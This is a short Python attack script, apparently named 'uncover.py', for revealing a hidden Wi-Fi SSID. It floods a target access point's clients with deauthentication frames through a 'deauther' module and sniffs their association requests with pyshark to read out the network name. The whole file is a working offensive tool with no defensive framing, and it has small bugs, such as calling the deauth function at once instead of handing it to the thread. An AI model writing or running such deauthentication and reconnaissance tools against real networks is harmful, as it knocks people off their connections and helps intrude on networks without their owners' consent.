import os
import packages
import argparse
from packages import deauther
import pyshark
import threading
import pyfiglet
import sys
from time import sleep
import linecache


parser = argparse.ArgumentParser(description='Uncover hidden SSID', prog= 'uncover.py')
parser.add_argument('-i' , '--interface', help='Enter interface name', required=True)
parser.add_argument('-m' , '--mac', help='Enter mac address', required=True)
parser.add_argument('-c' , '--channel', help='Enter channel number of hidden network', required=True)

banner = pyfiglet.figlet_format("uncover", font = "slant")

if os.path.isfile('ssid.txt'):
    os.remove('ssid.txt')

print(banner)


args = parser.parse_args()

interface = args.interface
mac = args.mac
ch = args.channel

def deauth(interface, mac, ch):
    try:
        print("Sending deauth...")
        packages.deauther.deauth(interface, mac, ch)
        print("")
    except Exception as e:
        print(e)


def intercept():
    try:
        capture = pyshark.LiveCapture(interface=interface, display_filter=f'wlan.bssid == {mac}  && wlan.fc.type_subtype == 0')
        capture.sniff(timeout= 5)
        for packet in capture.sniff_continuously(packet_count=1):
            with open('ssid.txt', 'w') as file:
                sys.stdout = file
                print(packet)
            sys.stdout = sys.__stdout__
            print("")
            line = linecache.getline('ssid.txt', 131)
            print(line.strip())
            os.remove('ssid.txt')
    except Exception as e:
        print(e)

thread1 = threading.Thread(target=intercept)
thread1.start()
print("Starting frame sniffer...")


sleep(5)
thread2 = threading.Thread(deauth(interface, mac, ch))
thread2.start()
